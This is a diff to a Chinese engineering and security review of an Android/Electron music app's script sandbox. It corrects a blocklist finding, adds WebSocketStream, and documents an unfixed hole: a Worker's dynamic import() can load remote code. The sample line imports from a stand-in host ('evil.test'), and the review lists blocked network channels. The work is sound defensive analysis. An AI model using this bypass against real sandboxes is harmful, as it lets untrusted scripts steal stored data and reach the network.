@@ -38,7 +38,10 @@
     仍未修的是：**W3**（medium，**本轮复核后确认它**不是 Android 与桌面的分歧** ——
     桌面 `preload.js:126-138` 逻辑相同、消费方 `useInitUserApi.ts:134` 又是共享代码，
     所以是**两侧共有的潜在缺陷**，修它要动共享渲染层、需要拍板）、
-    **W4**（medium，本地音乐把会话级 `blob:` URL 当身份持久化）、**W5–W9**（low）、
+    **W4**（medium，本地音乐把会话级 `blob:` URL 当身份持久化）、**W5**（**2026-10-16 复核：
+    原判理由是错的** —— 真 Worker 里没有 `navigator.sendBeacon`，真正漏掉的是 `WebSocketStream`，
+    已修；但同批实测发现一个**更真的口子**：Worker 里的动态 `import()` 能拉远程模块，
+    页面 CSP 关不掉它，**未修、需原生/架构拍板**，见 §6.4.6 / §6.4.6b）、**W6**（low）、
     以及 **W10**（**本轮更正**：`formData` 不是"静默发空请求"，
     `host.js:117` 会明确抛"Unsupported capability"，属于**已登记的显式不支持**，降为 low）。
     **W8 本轮已复核并修复**（web 产物里确实有 `electron-log` 的 Node 构建 ⇒ 真机上日志静默消失；
@@ -638,7 +641,7 @@ JSON 解出来的整数在 org.json 里常常是 `Integer`/`Long`，但**可能�
 | W2 | medium | `userApi/host.js:123` + `worker-runtime.js:31-32` | `preload.js:163` `if (isInitedApi) return` | 初始化**成功之后**，脚本里任何一次未捕获错误 / 未处理 rejection 都走 `fatal` ⇒ 状态翻假、worker 终止、在途请求 reject、弹"源码初始化失败"。**一个本来能用的源被一次异步小错毁掉** | **已复核 + 本轮已修** —— 见 §6.4.3 |
 | W3 | medium（**本轮复核后：不是 Android 与桌面的分歧**） | `userApi/contract.js:18-22`（经 `host.js:115-119`） | **桌面是同一套逻辑**：`src/main/modules/userApi/renderer/preload.js:126-138` 同样不检查空 `actions`、同样把剩下的照发；而**消费方是共享代码** `src/renderer/core/useApp/useInitUserApi.ts:134`（`qualitys[source] = sourceQualitys` 对**每一个** entry 都设）⇒ 两边都会出现"`assertApiSupport` 为真、但 `apis[source]` 里没有 `getMusicUrl`" | `filterSources` 会留下 `actions` 被过滤**空**的平台，而"一个可用平台都没有"也被当**成功**发布（`{status:true,sources:{}}`）。**⚠️ 这是两侧共有的潜在缺陷，不是 Android 单侧的偏差** —— 我复核了桌面那一份与共享的消费方，结论一致 | **已复核（两侧都读了）**。因为修它要改**共享渲染层**（会同时改变桌面行为），所以**本轮不动**：它需要一个决定 —— 是"丢掉没有可用 action 的平台、并在一个都没剩时报初始化失败"，还是维持现状（`filterSources` 之上的行为是 LX 的既有契约）。**登记为独立事项，不要当成 Android 侧缺陷去单向改。** |
 | W4 | medium | `filePicker/web.js:27` + `selectedFiles.js:2` + `renderer/utils/music.ts:83,90-91` | — | 选择器返回的是**会话级 `blob:` URL**，全仓只有 `UserApiModal.vue:95` 会释放；本地音乐那条路把 blob URL **当成歌曲身份持久化** ⇒ 重载后是一堆**永远播不了的歌**，且 File 句柄泄漏整场 | 未复核 |
-| W5 | low | `userApi/worker-runtime.js:25` 的能力黑名单 | — | 漏了 `navigator.sendBeacon`（Beacon 是 `[Exposed=(Window,Worker)]`）⇒ 脚本仍可绕过父侧那条被校验的 HTTP 通道直接外联 | 未复核（需真机 WebView） |
+| W5 | low（**2026-10-16 复核：原判的理由被实测推翻，真正的口子在别处**） | `userApi/worker-runtime.js` 的能力黑名单 | — | 原判说"Beacon 是 `[Exposed=(Window,Worker)]` ⇒ 可用 `navigator.sendBeacon` 外联"。**真 Worker 实测：`navigator.sendBeacon` 是 `undefined`**（`RTCPeerConnection`/`WebTransport`/`SharedWorker`/`caches` 也都不存在）⇒ 那个洞不成立。**同批实测里真正存在却漏掉的是 `WebSocketStream`（`function`）**，已补进黑名单。另修掉"构造式能力报 `unsupported is not a constructor`"的可诊断性缺陷 | **已复核（真机引擎实测）+ 本轮已修** —— 见 §6.4.6；**并且顺手实测出一个黑名单原理上管不了的真口子：Worker 里的动态 `import()`**（未修，需原生/架构拍板，见 §6.4.6b） |
 | W6 | low | `filePicker/web.js:7` + `views/Setting/components/SettingDownload.vue:31-38` | — | `openDirectory` 明确 reject，但那个调用点**没有 `.catch`** ⇒ Android 上点"选择保存目录"**静默无反应** | 未复核 |
 | W7 | low（**但对用户是"选完没反应"，本轮已修**） | `filePicker/web.js` 的 `returned` | — | 取消判定原来靠 `focus` + **一个固定 300 ms 定时器**去读 `input.files`。真机上 `focus` **早于** WebView 把文件填进 `input.files` 是常态，而结算只看那一刻的 `files` ⇒ **真选择被判成取消、文件静默丢掉**。这条路径是**首版范围内**的（自定义源导入、主题图导入、备份导入都走它） | **已复核（代码）+ 本轮已修** —— 见 §6.4.5 |
 | W8 | **升为 medium 并已修**（原判 low，本轮复核后确认后果比"低"严重） | `build-config/renderer/webpack.config.web.js` + `src/common/utils/index.ts:1`（`import log from 'electron-log/node'`） | — | web 产物里**确实有** `electron-log` 的 Node 构建。**实测证据（替换前，`dist-web` 的 `renderer.*.js` 与主 Worker chunk 都有）**：`AppData/Roaming`、`Library/Logs`、`xdg-open` —— 三个字面量都来自 `electron-log/src/node/NodeExternalApi.js`。后果**不是崩溃而是日志静默消失**：File 传输写盘时 `fs` 是空模块、抛错被 electron-log 自己的 `processInternalErrorFn` 吞掉 ⇒ **真机上应用自己的日志一条都不留**，而真机验收正要靠 logcat 看它 | **已复核（产物层 grep）+ 本轮已修** —— 见 §6.4.4 |
@@ -838,6 +841,94 @@ web/Android 产物里拿到的是**同一个 Node 构建** ⇒ 带 File 传输�
      `JSON.stringify` 比较，**跟着它写**；
   2. 变异工装**第五次**因为少拷文件报了 `fail 2`（这次缺的是 `load-capacitor.cjs`）。
      已把工装改成"**把 `tests/unit` 下所有非 `*.test.cjs` 的辅助文件都拷过去**"，不再逐个列举。
+
+#### 6.4.6 2026-10-16 复核：W5 更正 + 实测出真正的能力漏洞（`WebSocketStream`）
+
+**W5 原来的理由是错的，已实测推翻。** 原文说"Beacon 是 `[Exposed=(Window,Worker)]`，
+所以脚本能用 `navigator.sendBeacon` 绕过父侧那条被校验的 HTTP 通道"。在**真 Worker** 里实测
+（Electron 42 / Chromium 148；探针 `%TEMP%\rain-worker-capability-probe.cjs`，一个真 `Blob` Worker）：
+
+| 能力 | 真 Worker 里的实测 |
+|---|---|
+| `navigator.sendBeacon` | **`undefined`** ⇒ W5 说的那个洞**不成立** |
+| `RTCPeerConnection` / `webkitRTCPeerConnection` | `undefined` |
+| `WebTransport` / `SharedWorker` / `caches` | `undefined`（黑名单里本来就有 —— 属"能力不存在也照钉"） |
+| **`WebSocketStream`** | **`function`** ⇒ **存在、却没被拦住**，这才是同类里真正的口子 |
+| `fetch` / `XMLHttpRequest` / `WebSocket` / `EventSource` / `importScripts` / `Worker` / `indexedDB` | 存在，**已在黑名单** |
+| `BroadcastChannel` / `MessageChannel` / `WebAssembly` / `crypto` / `location` | 存在，但**不是网络面**（不是外联通道），不动 |
+
+**本轮改法**（`src/renderer/platform/userApi/worker-runtime.js`）：
+
+1. `WebSocketStream` 补进黑名单；
+2. `navigator.sendBeacon` **也照钉** —— 定位是**纵深防御**：Worker 里今天没有它，
+   但 Android 上跑的是**系统 WebView**，其 Chromium 版本不归我们钉；与既有 `WebTransport` /
+   `SharedWorker` 同一处理（"能力不存在也照钉"）；
+3. 顺带修掉一个**可诊断性**缺陷：`unsupported` 原来是**箭头函数**，没有 `[[Construct]]`，
+   于是 `new WebSocket(...)` / `new XMLHttpRequest()` / `new WebSocketStream(...)` 这些**构造式**
+   用法会先抛 `unsupported is not a constructor`，把"该走 `lx.request`"这句话盖掉。
+   网络**仍然被拦住**，所以这是可诊断性问题、**不是洞** —— 由本轮新增的**构造式**断言抓出来。
+
+**证据**：`tests/unit/android-user-api-host.test.cjs` 的隔离用例加了两条断言（`WebSocketStream`
+构造式 + `navigator.sendBeacon` 调用式）。关键是**夹具必须先真的拥有这两个能力**
+（`tests/unit/fixtures/android-user-api/node-worker.cjs`）—— 否则守卫能把不存在的属性
+`defineProperty` 出来、断言会**空过**（这正是我今天差点又踩的一次"夹具说谎"）。
+
+**变异**（出仓副本，1071 个 tracked 文件全拷 + `node_modules` junction）：
+
+| 变异 | 结果 |
+|---|---|
+| 去掉 `'WebSocketStream', ` | **fail 1** —— 正是那条隔离用例 |
+| 去掉 `navigator.sendBeacon` 守卫 | **fail 1** —— 同上 |
+| `function unsupportedCapability ()` 改回 `() =>` | **fail 1** —— 同上（就是上面第 3 条的缺陷） |
+| 未变异对照 | exit 0 |
+
+单测 470 / 470、四个 tsc exit 0。
+
+#### ⚠️ 6.4.6b 同批实测出的**真口子**：Worker 里的动态 `import()`（**未修，需拍板**）
+
+查黑名单时顺手问了一句"还有没有别的外联面"，结果探到一个**黑名单在原理上就管不了**的：
+
+```js
+await import('https://evil.test/payload.js')   // 在自定义源的 Worker 里
+```
+
+`import()` 是**语法**，不是可以 `defineProperty` 掉的全局属性 ⇒ 删不掉。于是问题变成
+"这次抓取**允不允许**"。做了四个探针（`%TEMP%\rain-worker-*-probe*.cjs`，全部在 Electron 42 里真跑，
+其中一个还起了本地 HTTP 服务器，直接看**服务器有没有收到那个模块请求**）：
+
+| 场景 | Worker 起没起来 | 远程 `import()` 成功吗 | 本地服务器收到 `/mod.js` 吗 |
+|---|---|---|---|
+| **当前 App 的形态**：同源 worker + 页面**没有任何 CSP** | 是 | **成功** | **收到了** |
+| 同源 worker + 页面 `script-src 'self' 'unsafe-eval'`（meta 与 header 都试） | 是 | **仍然成功** | **收到了** |
+| blob worker + 只给 `script-src 'self' 'unsafe-eval'`（不给 `worker-src`） | **否**（worker 直接被拦死） | — | 没有 |
+| blob worker + `worker-src 'self' blob:` + `script-src 'self' 'unsafe-eval'` | 是 | **仍然成功** | **收到了** |
+
+**两个否定结论（各替下一轮省一次）**：
+
+1. **"给 App 页面加个 CSP"不能关掉这个洞。** 同源 worker 的 CSP 取自**它自己那个脚本响应**而不是页面；
+   而一旦放开 `worker-src blob:` 让 blob worker 能起来，继承到的策略又拦不住 `import()`。
+   唯一"看着有效"的那一格（blob worker 且没有 `worker-src`）其实是**把 worker 整个拦死了** ——
+   我第一版探针就差点据此得出"加 CSP 就修好了"的**错误结论**，是加跑同源 worker 那一格才推翻的。
+2. **应用页面现在完全没有 CSP**：`src/renderer/index.html` 与构建产物 `dist-web/index.html` 里都没有
+   `Content-Security-Policy`；全仓唯一一条 CSP 在桌面的
+   `src/main/modules/userApi/renderer/user-api.html:5`（`default-src 'none'`）。
+   所以 Android 上这个洞是**活的**。
+
+**后果**：一个恶意社区音源脚本可以 `import()` 一个远程 ES 模块，那段代码**以 App 的 origin 运行**
+⇒ 能读同一 origin 的存储（`rain:store:*` 里的曲库/歌单、以及**已导入的源脚本本体**）、能外联，
+完全绕开 `lx.request` 那条被校验的通道。
+
+**为什么本轮不修**：可选修法都要动**原生或架构**，而且**本机验证不了**：
+
+- **首选**：给 **worker 脚本那个响应**加 CSP 头（`Content-Security-Policy: script-src 'self' 'unsafe-eval'`）。
+  Worker 的 CSP 按规范就取自它自己的响应头；但 Android 侧 worker 是本地 asset，
+  要加响应头得走 Capacitor 的 asset loader / 自定义 scheme handler 或
+  `WebViewClient.shouldInterceptRequest` ⇒ **原生改动，只能真机验**。
+- **备选（同为原生）**：`shouldInterceptRequest` 直接拒绝"由 App origin 发起、跨源、type 为 script/module"的请求。
+- ⚠️ **不要用"页面加 meta CSP"当修法** —— 上表已实测无效，别让下一个人再花一轮。
+
+**登记为独立事项**：先拍板"asset loader 加响应头"还是"网络层拦截"，再按原生改动排期；
+拍板之前**不要在渲染层做看起来像修了的改动**。
 
 **对 6.4 这一轮审查确认"没问题"的部分**（省下一次重查）：
 
